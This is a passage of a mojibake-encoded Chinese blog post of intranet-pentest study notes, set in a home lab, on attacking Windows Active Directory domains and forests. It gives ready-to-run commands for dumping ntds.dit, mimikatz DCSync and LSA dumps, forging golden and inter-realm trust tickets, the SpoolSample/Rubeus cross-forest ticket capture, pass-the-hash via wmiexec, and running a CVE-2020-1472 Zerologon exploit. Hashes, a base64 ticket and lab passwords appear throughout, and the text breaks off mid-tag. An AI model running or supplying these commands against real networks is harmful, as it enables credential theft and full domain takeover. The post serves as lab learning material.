href="https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy">https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162512699.png" alt="image-20220707162512699"></p><p>é€‰æ‹©å¯¹åº”ç‰ˆæœ¬ä¸‹è½½å³å¯</p><p>å°†è¿™ä¸‰ä¸ªç¨‹åºæ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œæ‰§è¡ŒShowCopy.bat</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162553598.png" alt="image-20220707162553598"></p><p>æ‰§è¡Œå:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162651423.png" alt="image-20220707162651423"></p><p>ä½¿ç”¨ esentutl ä¿®å¤å¯¼å‡ºçš„ ntds.dit æ–‡ä»¶:</p><pre><code class="shell">esentutl /p /o ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162752787.png" alt="image-20220707162752787"></p><p>æœ€åé€šè¿‡ QuarksPwDump.exe å¯¼å‡ºåŸŸè´¦å·å’Œæ•£åˆ—å€¼:</p><pre><code class="shell">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o result.txt</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162932295.png" alt="image-20220707162932295"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162952291.png" alt="image-20220707162952291"></p><h2 id="è·¨åŸŸæ”»å‡»åˆ†æåŠé˜²å¾¡"><a href="#è·¨åŸŸæ”»å‡»åˆ†æåŠé˜²å¾¡" class="headerlink" title="è·¨åŸŸæ”»å‡»åˆ†æåŠé˜²å¾¡"></a>è·¨åŸŸæ”»å‡»åˆ†æåŠé˜²å¾¡</h2><h3 id="åŸŸé—´ä¿¡ä»»æ¦‚è¿°"><a href="#åŸŸé—´ä¿¡ä»»æ¦‚è¿°" class="headerlink" title="åŸŸé—´ä¿¡ä»»æ¦‚è¿°"></a>åŸŸé—´ä¿¡ä»»æ¦‚è¿°</h3><p><strong>ä¸ºä»€ä¹ˆä¼šæœ‰åŸŸä¿¡ä»»?</strong></p><p>åœ¨åŒä¸€ä¸ªåŸŸå†…ï¼Œç®¡ç†å‘˜å¯ä»¥å®ç°èµ„æºçš„ç»Ÿä¸€ç®¡ç†ã€åˆ†é…ã€‚æœ‰äº›ä¼ä¸šä¼šç”¨åˆ°å¤šä¸ªåŸŸï¼Œåˆ›å»ºåŸŸé—´ä¿¡ä»»å¯ä»¥æ–¹ä¾¿è·¨åŸŸèµ„æºåˆ†é…ã€‚</p><p><strong>ä¿¡ä»»æ˜¯æœ‰æ–¹å‘çš„:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170708834.png" alt="image-20220707170708834"></p><p><strong>ä¿¡ä»»ä¼ é€’:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170843465.png" alt="image-20220707170843465"></p><p><strong>åŸŸæ ‘å’ŒåŸŸæ—:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171001846.png" alt="image-20220707171001846"></p><p><strong>åŸŸé—´ä¿¡ä»»å®ä¾‹:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171110376.png" alt="image-20220707171110376"></p><p><strong>åŸŸé—´ä¿¡ä»»åˆ†ç±»</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171153927.png" alt="image-20220707171153927"></p><h3 id="åŸŸé—´ä¿¡ä»»ä¿¡æ¯æ”¶é›†ã€åˆ©ç”¨æ€è·¯"><a href="#åŸŸé—´ä¿¡ä»»ä¿¡æ¯æ”¶é›†ã€åˆ©ç”¨æ€è·¯" class="headerlink" title="åŸŸé—´ä¿¡ä»»ä¿¡æ¯æ”¶é›†ã€åˆ©ç”¨æ€è·¯"></a>åŸŸé—´ä¿¡ä»»ä¿¡æ¯æ”¶é›†ã€åˆ©ç”¨æ€è·¯</h3><p><strong>ç¯å¢ƒæ­å»º</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171848435.png" alt="image-20220707171848435"></p><p><strong>æŸ¥çœ‹åŸŸé—´ä¿¡ä»»</strong></p><p>å‘½ä»¤:</p><pre><code class="shell">nltest /domain_trusts  /primary ä»…è¿”å›è®¡ç®—æœºè´¦æˆ·å±äºçš„åŸŸ # å¦‚nltest /domain_trusts /primary/forest ä»…è¿”å›ä¸»åŸŸåŒä¸€æ£®æ—ä¸‹çš„åŸŸ/direct_out è¿”å›è¢«ä¸»åŸŸæ˜ç¡®ä¿¡ä»»çš„åŸŸ/direct_in è¿”å›æ˜ç¡®ä¿¡ä»»ä¸»åŸŸçš„åŸŸ/all_trusts è¿”å›æ‰€æœ‰å·²ä¿¡ä»»çš„åŸŸ/V æ˜¾ç¤ºè¯¦ç»†çš„è¾“å‡ºï¼ŒåŒ…æ‹¬åŸŸçš„SIDså’ŒGUIDs</code></pre><pre><code>netdom query trust #åªèƒ½åœ¨åŸŸæ§ä¸Šä½¿ç”¨</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711230039383.png" alt="image-20220711230039383"></p><p><strong>å·¥å…·:</strong></p><p><strong>æ”¶é›†åŸŸè¯¦ç»†ä¿¡æ¯:</strong></p><p>powerview</p><p>ä¸‹è½½é“¾æ¥:<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>ä¸€èˆ¬ä¸å…è®¸æ‰§è¡Œï¼Œå¯ä½¿ç”¨ISESteroidsæ¨¡å—ç»•è¿‡</p><pre><code class="shell">PowerShell.exe -ExecutionPolicy Bypass -command &quot;..\powerview.ps1;Get-NetDomainTrust&quot;</code></pre><p>adfindï¼š</p><p>ä¸‹è½½é“¾æ¥:<a href="http://www.joeware.net/freetools/tools/adfind/">http://www.joeware.net/freetools/tools/adfind/</a></p><ul><li>-appverï¼šæ˜¾ç¤ºadfindç‰ˆæœ¬ä¿¡æ¯</li><li>-bï¼šæŒ‡å®šè¦æŸ¥è¯¢çš„æ ¹èŠ‚ç‚¹basedn</li><li>-bitï¼šæŒ‡å®šä½æŸ¥è¯¢</li><li>-c:  åªç»Ÿè®¡æ•°é‡</li><li>-csvï¼šå¯¼å‡ºä¸ºcsvæ ¼å¼</li><li>-dnï¼šåªæ˜¾ç¤ºdnï¼Œä¸è¿”å›è¯¦ç»†ä¿¡æ¯</li><li>-fï¼šLDAPè¿‡æ»¤æ¡ä»¶ï¼ŒæŒ‡å®šldapè¯­æ³•</li><li>-hï¼šæŒ‡å®šä¸»æœºä¸ç«¯å£(ip:port)</li><li>-recmuteï¼šåˆ é™¤dnä¸‹é¢æ²¡æœ‰çš„</li><li>-sï¼šæœç´¢çš„èŒƒå›´ï¼Œ æœ‰ one(å½“å‰å±‚çº§)/sub(ä¸€å±‚ä¸€å±‚é€’å½’)ï¼Œé»˜è®¤æ˜¯sub</li><li>-sdnaï¼šéåŸŸç®¡æŸ¥è¯¢sdä¿¡æ¯</li><li>-tï¼šæŸ¥è¯¢è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤120ç§’</li><li>-uï¼šæŒ‡å®šç”¨æˆ·</li><li>-upï¼šæŒ‡å®šç”¨æˆ·çš„å¯†ç </li></ul><pre><code>adfind.exe -h ip -sc u:* #å¦‚ AdFind.exe -h WIN-OSOIFGPM536.sakura.com -sc u:Administrator</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710000000436.png" alt="image-20220710000000436"></p><p>adexplorer</p><p>ä¸‹è½½é“¾æ¥:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer</a></p><p>è¾“å…¥åŸŸæ§çš„è´¦å·å¯†ç å°±å¯ä»¥è¿›è¡Œç®¡ç†</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710092143570.png" alt="image-20220710092143570"></p><p><strong>æ”¶é›†åŸŸç½‘ç»œä¿¡æ¯:</strong></p><p>nltestã€pingã€dnscmd</p><pre><code>nltest /domain_trustsnltest /dclist:companyping sakura.comdnscmd /enumzones</code></pre><p><strong>åˆ©ç”¨æ€è·¯</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710093631488.png" alt="image-20220710093631488"></p><h3 id="è·¨åŸŸæ”»å‡»"><a href="#è·¨åŸŸæ”»å‡»" class="headerlink" title="è·¨åŸŸæ”»å‡»"></a>è·¨åŸŸæ”»å‡»</h3><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094448657.png" alt="image-20220710094448657"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094713427.png" alt="image-20220710094713427"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094732640.png" alt="image-20220710094732640"></p><h4 id="SIDHistoryä»‹ç»å’Œåˆ©ç”¨"><a href="#SIDHistoryä»‹ç»å’Œåˆ©ç”¨" class="headerlink" title="SIDHistoryä»‹ç»å’Œåˆ©ç”¨"></a>SIDHistoryä»‹ç»å’Œåˆ©ç”¨</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094901181.png" alt="image-20220710094901181"></p><p><strong>åˆ©ç”¨åŸŸä¿¡ä»»å¯†é’¥è·å–ç›®æ ‡åŸŸæƒé™</strong></p><ul><li><p>å­˜åœ¨ä¿¡ä»»è´¦æˆ·çš„æƒ…å†µä¸‹ï¼šDcsyncè·å–ä¿¡ä»»è´¦å·çš„NTLMå€¼</p></li><li><pre><code>Get-ADUser -Filter &#123;samAccountName -like &quot;*$&quot;&#125; #å¦‚ä½•æ— æ³•æ‰¾åˆ°Get-ADuserå‘½ä»¤ï¼Œåˆ™å¯¼å…¥æ¨¡å— import-module activedirectory</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231847885.png" alt="image-20220711231847885"></p><ul><li><pre><code class="shell">.\mimikatz.exe &quot;lsadump::dcsync /user:sakura$@HY.sakura.com&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231746078.png" alt="image-20220711231746078"></p><hr><ul><li><p>å†…éƒ¨ä¿¡ä»»:lsadumpè·å–ä¿¡ä»»è´¦å·çš„NTLMå€¼</p></li><li><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:sakura$&quot; &quot;lsadump::trust /patch&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711232854715.png" alt="image-20220711232854715"></p><p><strong>ä¿¡ä»»ç¥¨æ®çš„åˆ›å»º</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710102754875.png" alt="image-20220710102754875"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /rc4:56de60dc2e57db6b03fc5e9834965f26 /user:sakura /service:krbtgt /target:sakura.com /ticket:sakura.kirbi&quot; #/ticketåé¢çš„å«ä¹‰æ˜¯ä¿å­˜çš„æ–‡ä»¶å</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235022847.png" alt="image-20220711235022847"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235119876.png" alt="image-20220711235119876"></p><p>æˆ‘ä»¬å…ˆçœ‹ï¼Œç›®å‰æ˜¯æ— æ³•è®¿é—®çˆ¶åŸŸèµ„æºçš„</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235628387.png" alt="image-20220711235628387"></p><p><strong>TGSè·å–å’Œåˆ©ç”¨</strong></p><pre><code>.\asktgs.exe C:\Users\Administrator\Desktop\sakura.kirbi CIFS/fy.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000226225.png" alt="image-20220712000226225"></p><pre><code class="shell">.\kirbikator.exe lsa .\CIFS.fy.sakura.com.kirbi</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000341715.png" alt="image-20220712000341715"></p><p>ç„¶åå°±å¯ä»¥æˆåŠŸå¯¹å­åŸŸè¿›è¡Œæ“ä½œäº†</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000536307.png" alt="image-20220712000536307"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712001240811.png" alt="image-20220712001240811"></p><h4 id="åˆ©ç”¨krbtgtæ•£åˆ—è·å–ç›®æ ‡åŸŸæƒé™"><a href="#åˆ©ç”¨krbtgtæ•£åˆ—è·å–ç›®æ ‡åŸŸæƒé™" class="headerlink" title="åˆ©ç”¨krbtgtæ•£åˆ—è·å–ç›®æ ‡åŸŸæƒé™"></a>åˆ©ç”¨krbtgtæ•£åˆ—è·å–ç›®æ ‡åŸŸæƒé™</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712110239522.png" alt="image-20220712110239522"></p><p><strong>kebtgtæ•£åˆ—è·å–</strong></p><pre><code class="shell">privilege::debuglsadump::lsa /patch /user:krbtgtsekurlsa::krbtgtexit</code></pre><p>æˆ–è€…ç›´æ¥åˆå¹¶æˆä¸€å¥è¯</p><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:krbtgt&quot; &quot;sekurlsa::krbtgt&quot; &quot;exit&quot;</code></pre><p><strong>æ„é€ å¹¶æ³¨å…¥é»„é‡‘ç¥¨æ®</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111832854.png" alt="image-20220712111832854"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /user:administrator /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /krbtgt:803b57a2a73cdc03133e631db7f506ad /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111644256.png" alt="image-20220712111644256"></p><h3 id="æ—ä¿¡ä»»æ”»å‡»"><a href="#æ—ä¿¡ä»»æ”»å‡»" class="headerlink" title="æ—ä¿¡ä»»æ”»å‡»"></a>æ—ä¿¡ä»»æ”»å‡»</h3><p>æˆ‘è¿™é‡Œè®¾ç½®ä¸¤ä¸ªåŸŸ:</p><p>sakura.comã€salmon.com</p><p>ä¸€å° ly-1 å¯†ç :yk2012.com</p><p>ä¸€å° ly-2 å¯†ç :yk-22012.com</p><h4 id="MS-RPPRNè·å–ä¿¡ä»»æ—æƒé™"><a href="#MS-RPPRNè·å–ä¿¡ä»»æ—æƒé™" class="headerlink" title="MS-RPPRNè·å–ä¿¡ä»»æ—æƒé™"></a>MS-RPPRNè·å–ä¿¡ä»»æ—æƒé™</h4><p><strong>åˆ©ç”¨æ¡ä»¶</strong>:éœ€è¦è®¾ç½®ä¸€å°ä¸»æœºè´¦æˆ·å¼€å¯äº†éçº¦æŸå§”æ´¾åŸŸå†…æœºå™¨çš„æƒé™ï¼Œå®é™…å¯é…åˆpowerviewè„šæœ¬æŸ¥æ‰¾ä¸»æœºï¼ŒåŸŸæ§ä¸»æœºéœ€è¦ä¸ºwin2012 server r2 ä»¥ä¸Š ç‰ˆæœ¬ï¼ŒPrint SpooleræœåŠ¡é»˜è®¤æ˜¯è‡ªåŠ¨è¿è¡Œçš„</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712112745485.png" alt="image-20220712112745485"></p><p><strong>å®éªŒåœºæ™¯:</strong></p><ul><li>å·²è·å¾—ä¸€ä¸ªæ—çš„æƒé™(EA).ã€‚æœ¬ä¾‹ä¸ºsakura.com</li><li>é…ç½®äº†æ— çº¦æŸå§”æ´¾çš„ã€å·²è¢«æ”»å‡»è€…æ§åˆ¶çš„ä¸€å°æœåŠ¡å™¨(ly-1.sakura.com)</li><li>åœ¨æ¼”ç¤ºæ¡ˆä¾‹ä¸­ï¼Œæ”»å‡»è€…å…¥ä¾µäº†æ ¹åŸŸçš„åŸŸæ§åˆ¶å™¨(DC),åˆ©ç”¨è¯¥DCæ”»å‡»å¦ä¸€ä¸ªåŸŸæ—ä¸­çš„å¦ä¸€ä¸ªDC</li><li>ç›®æ ‡åŸŸæ—:æœ¬ä¾‹ä¸­ä¸ºsalmon.com</li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713162710957.png" alt="image-20220713162710957"></p><p><strong>æ”»å‡»ç¤ºæ„å›¾</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150156656.png" alt="image-20220712150156656"></p><p><strong>åˆ©ç”¨å·¥å…·</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150254348.png" alt="image-20220712150254348"></p><pre><code class="shell">.\Rubeus.exe monitor /interval:5 /filteruser:ly-2$</code></pre><p>intervalå‚æ•°ç”¨äºè®¾ç½®ç›‘æ§çš„æ—¶é—´é—´éš”ï¼Œå•ä½ä¸ºç§’ï¼›filteruserç”¨äºæŒ‡å®šæ¸—é€æµ‹è¯•ä¸­éœ€è¦å…³æ³¨çš„ç”¨æˆ·</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160424988.png" alt="image-20220713160424988"></p><pre><code class="shell">.\SpoolSample.exe ly-2.salmon.com ly-1.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713155559395.png" alt="image-20220713155559395"></p><p>æ­¤æ—¶rubeusç›‘å¬åˆ°äº†TGT</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160359007.png" alt="image-20220713160359007"></p><p>ä½¿ç”¨Rubeuså·¥å…·ç›´æ¥æŠŠbase64å­—ç¬¦ä¸²å¯¼å…¥ç¥¨æ®ï¼š</p><pre><code class="shell">.\Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIBBaEDAgEWooIEBjCCBAJhggP+MIID+qADAgEFoQwbClNBTE1PTi5DT02iHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbClNBTE1PTi5DT02jggPCMIIDvqADAgESoQMCAQKiggOwBIIDrBG1txlv0N5lRuOFLSbrz8uiCgjf4LwfNvlgi5p0Q80N4A9p301eRDthpV4Bwd7JCHjL7tQ/gZNU3cbA6PO3YCpg5AiVYcR7OnvfIU2LByxKN2iA4YMXRTIhFJZlRiuu4Wh2CQVbDHM+WR8rTHwnAetzq9uOkUrL7HiyK09IT1dmaQS5z7jm3WoRiSfqzfqrqpkrYUXHrKTNmeqdOxX9moYgpsFjKXwMZdHVcmnDLndt147OhMQfFOKwiVtN29YH/rvbmJnrYVLu6ZWZZpi7bj/bXY9pY8GeoNGxJMVZbiULiRnfToi0Db8DMpo115omCnsX7qfquZp5NmbyzO2/V1jknoUQ6k2qIvF+bvjydlh1PciiWxosTAMbD6bJMvwUUT78DZN6IRW9Dg0p3PgVexL73/BwCJ8f89cMzdXh7kZHm/ozhJI9uf1p0v9J2tu0g3flGDo+MF+VZBYBgVXNHiCM1oQGuEPI0Lx2Xs1JR5CCq4HdGh0tNgBIc7ppYg9W8S+6OfZU8dyQdtFh2Rc76CNHEipCzCZYBTctIJ5IV02oPzTM3lvQrbd2BsDBpWPqlV3u/7r5vm2ywp81yA2n7ZCYrZP+F9NP46IXIQ0hKT9VKoNf5ODqbH7H+0bfZogAMuMNN7Bs746NyC7qjhUbRWlmtRNfSlNqaHvsXdzcG7s87gTO9bS0v4Vxxf1ZFGnjsXfia/zvjIFymUdTJzak86FjyCj9HzxWmnSnImwT2WShnWex+S5PfOnuH7Mu8hSe/riKpdK1HdrRL3hBhhsT+vE3HNmLr7DIF0iZ5523Fibp0tOAgGf0LABdHa60anzlOSR5k2gWLSa4JifMxjohaQ5VUt3af6hewd67ZuTL9afVJyvYgAhjOsG7WEPJ1xgN3kOSp9KO+gZV7h9nKEeSScCaIDp5N29fU9CSxOzfQwct7i12BJwSGCK17S3M84v3DSXZWHmq891p2rw4Sr8BBEOE0FDfRhdnboNzkQ5Qf7CS2pafxLxtfQDiWKu2JQdRzNrLkb30zTBG4/uY/o9TBiN5mPSOPSjEqKVurkU3T0M1mYGaX9S0NdppQHKTMDEFdSMY58YzQ25PaEqMqUlvwI0V8c4cVRHsAtefz8GPfHS1I5ENB0OsSoRmWfel0T9/XX7gUjxgf4pQDYzLKb+WZm2fVMKVfB+U2kLcDC3oQ2wnRkmAYLYxJrKOVJRQVlPbIwhCsaP0JYX658qEA6BO9DjhJbz4jfXzOL+TH7ejgd0wgdqgAwIBAKKB0gSBz32BzDCByaCBxjCBwzCBwKArMCmgAwIBEqEiBCAsySonk73tkRU5Ja0UNRWW/zhAgUSZuBym4G3BFO7qKqEMGwpTQUxNT04uQ09NohIwEKADAgEBoQkwBxsFTFktMiSjBwMFAGChAAClERgPMjAyMjA3MTMwNzM0NDRaphEYDzIwMjIwNzEzMTczNDQ0WqcRGA8yMDIyMDcxMzE3MzQ0NFqoDBsKU0FMTU9OLkNPTakfMB2gAwIBAqEWMBQbBmtyYnRndBsKU0FMTU9OLkNPTQ==</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163130505.png" alt="image-20220713163130505"></p><pre><code class="shell">.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /user:krbtgt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163220750.png" alt="image-20220713163220750"></p><pre><code class="shell">.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::purge&quot; exit.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::golden /user:administrator /domain:salmon.com /sid:S-1-5-21-3200352805-2293635123-428118185 /rc4:8da01a075e60007f23b3ce18b77b9a0f /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713164513444.png" alt="image-20220713164513444"></p><p><strong>è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œå‘½ä»¤æ‰§è¡Œ</strong></p><pre><code>.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /all /csv&quot; exit</code></pre><p>è·å¾—ä¿¡æ¯:</p><pre><code class="shell">1104    SAKURA$ 76771a6354707379eb4bfd77a28224e5        20801001    LY-2$   0d9a393377c2f46a3b2a20a95954e540        532480500     Administrator   8168027b15e25c5d6ad39528429229d6        512502     krbtgt  8da01a075e60007f23b3ce18b77b9a0f        514</code></pre><pre><code>python3 ./wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:8168027b15e25c5d6ad39528429229d6 ly-2.salmon.com/administrator@192.168.64.151</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713171855227.png" alt="image-20220713171855227"></p><h4 id="æ‰©å±•-CVE-2020-1472-windowsåŸŸæ§ææƒ"><a href="#æ‰©å±•-CVE-2020-1472-windowsåŸŸæ§ææƒ" class="headerlink" title="æ‰©å±• CVE-2020-1472 windowsåŸŸæ§ææƒ"></a>æ‰©å±• CVE-2020-1472 windowsåŸŸæ§ææƒ</h4><p>CVE-2020-1472 æ˜¯â¼€ä¸ª windows åŸŸæ§ä¸­ä¸¥é‡çš„è¿œç¨‹æƒé™æå‡æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ NetLogonï¼Œå»ºâ½´ä¸åŸŸæ§é—´æ˜“å—æ”»å‡»çš„å®‰å…¨é€šé“æ—¶ï¼Œå¯åˆ©â½¤æ­¤æ¼æ´è·å–åŸŸç®¡è®¿é—®æƒé™ï¼ˆå°†åŸŸæ§ä¸­ä¿å­˜åœ¨ADä¸­çš„ç®¡ç†å‘˜passwordè®¾ç½®ä¸ºç©ºï¼‰ï¼›å…¶æ¼æ´åŸç†æ˜¯å‘â½£åœ¨ RPC è®¤è¯è¿‡ç¨‹çš„è¿‡ç¨‹ä¸­ï¼Œç”±äºé”™è¯¯çš„ä½¿â½¤äº† AES-CFB8 åŠ å¯†æ‰€å¯¼è‡´æ¼æ´æˆå› ï¼Œè¯¥æ¼æ´é€‚â½¤äº Win2008 åçš„æ‰€æœ‰ç‰ˆæœ¬</p><p>åˆ©ç”¨åœºæ™¯ï¼šè·å–äº†ä¸€ä¸ªåŠ å…¥äº†åŸŸçš„è®¡ç®—æœºæƒé™ï¼Œåœ¨åŸŸæ™®é€šè´¦å·çš„æƒ…å†µä¸‹ï¼Œå°†åŸŸç®¡å¯†ç ç½®ç©ºï¼Œå¯¼å‡ºåŸŸç®¡hashï¼Œç„¶åè¿›è¡Œè¿æ¥ </p><p>psï¼šåœ¨å®æˆ˜ç¯å¢ƒä¸­ï¼Œç”±äºä¼šæŠŠåŸŸæ§æœºå™¨çš„è´¦æˆ·å’Œå¯†ç æ¸…ç©ºï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¼šå¯¼è‡´åŸŸå†…å‡ºé—®é¢˜ï¼Œå¯èƒ½å¯¼è‡´æŸäº›æœåŠ¡â½†æ³•æ­£å¸¸è¿â¾ï¼Œä¸¥é‡ä¼šé€ æˆè„±åŸŸç­‰æƒ…å†µï¼Œè¯·è°¨æ…åˆ©â½¤ã€‚</p><p>å‰ç½®æ¡ä»¶ï¼šç›®æ ‡åŸŸæ§å­˜åœ¨æ­¤æ¼æ´æœªæ‰“è¡¥ä¸ï¼Œè¿™ä¸ªæ¼æ´ç”¨åˆ°äº†MS-NRPCåè®®ï¼Œç”¨åˆ°äº†135ç«¯å£</p><p>æ³¨æ„ï¼šåœ¨æ£€æµ‹æˆ–è€…æ‰§è¡Œexpçš„æ—¶å€™ï¼Œæ‰€åœ¨ä¸»æœºä¸ä¸€å®šåŠ å…¥åŸŸç¯å¢ƒä¸­ï¼Œåœ¨æ¶‰åŠåŸŸè§£æçš„æ—¶å€™ç›´æ¥åœ¨hostsé‡Œé¢è®¾ç½®åŸŸåå¯¹åº”ipå°±è¡Œ</p><p>å¤ç°æ­¥éª¤:</p><p>é¦–å…ˆè·å–ä¸»æœºå:</p><pre><code class="shell">nbtstat -A 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713221143362.png" alt="image-20220713221143362"></p><p><strong>æ¢æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´:</strong></p><p>é“¾æ¥:<a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223158821.png" alt="image-20220713223158821"></p><p><strong>å­˜åœ¨æ¼æ´ï¼Œä¸‹ä¸€æ­¥æ‹¿expå»æ‰“</strong></p><p>expé“¾æ¥:<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><pre><code class="shell">python3 cve-2020-1472-exploit.py ly-1 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223643646.png" 